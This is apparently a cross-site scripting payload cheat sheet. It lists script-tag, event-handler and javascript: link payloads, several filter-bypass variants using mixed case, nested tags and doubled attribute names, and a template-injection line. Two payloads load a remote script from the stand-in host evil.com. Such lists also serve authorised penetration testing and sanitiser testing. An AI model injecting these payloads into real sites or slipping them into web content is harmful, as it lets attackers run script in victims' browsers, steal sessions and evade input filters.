### Basic
```html
<script>alert("XSS")</script>
<script src="https://evil.com/a.js"></script>
<img src="x" onerror="alert(1234)">
<button onclick="alert(1234)">CLICK ME</button>
<a href="javascript:alert(777)">CLICK ME</a>
```

### Bypass Tags Removal
```html
<ScRipT>alert("XSS")</sCrIpt>
<scr<script>ipt>alert("XSS")</scr<script>ipt>
<script src="https://evil.com/a.js" //
<img src=x onerror=alert(1234) //
```

### Bypass Attribute Removal
```html
<img sRC=x onRrrOR="alert(1234)">
<img src=x oonerror=nerror="alert(1234)">
<img src=x oonclicknerror="alert(1234)">
```

### Template Injection
```js
{{ 1+1 }}
{{ alert(123) }}
```